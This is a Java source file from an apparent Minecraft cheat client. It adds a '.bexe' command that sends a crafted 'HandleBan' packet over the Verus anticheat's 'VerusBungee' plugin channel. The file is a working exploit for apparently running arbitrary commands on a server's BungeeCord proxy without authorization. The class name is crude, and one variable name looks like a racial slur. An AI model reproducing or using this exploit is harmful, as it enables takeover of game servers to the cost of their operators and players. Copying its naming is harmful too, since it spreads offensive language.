package it.nobusware.client.commands;

import java.io.ByteArrayOutputStream;
import java.io.DataOutputStream;

import io.netty.buffer.Unpooled;
import it.nobusware.client.manager.Command;
import it.nobusware.client.utils.ChatUtils;
import net.minecraft.client.Minecraft;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C17PacketCustomPayload;

public class verusfucker extends Command {

	@Override
	public String getAlias() {
		return "bexe";
	}

	@Override
	public String getDescription() {
		return "Esegue Comandi Dal Bungee";
	}

	@Override
	public String getSyntax() {
		return ".bexe <command>";
	}

	@Override
	public void onCommand(String paramString, String[] paramArrayOfString) throws Exception {
		Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("REGISTER", (new PacketBuffer(Unpooled.buffer())).writeString("VerusBungee")));
		ByteArrayOutputStream b = new ByteArrayOutputStream();
		DataOutputStream out = new DataOutputStream(b);
		out.writeUTF("HandleBan");
		out.writeUTF(paramArrayOfString[0] + paramArrayOfString[1]);
		PacketBuffer negger = (new PacketBuffer(Unpooled.buffer()));
		negger.writeBytes(b.toByteArray());
		Minecraft.getMinecraft().thePlayer.sendQueue.addToSendQueue(new C17PacketCustomPayload("VerusBungee", negger));
		ChatUtils.print("Packet Sended.");
	}
}
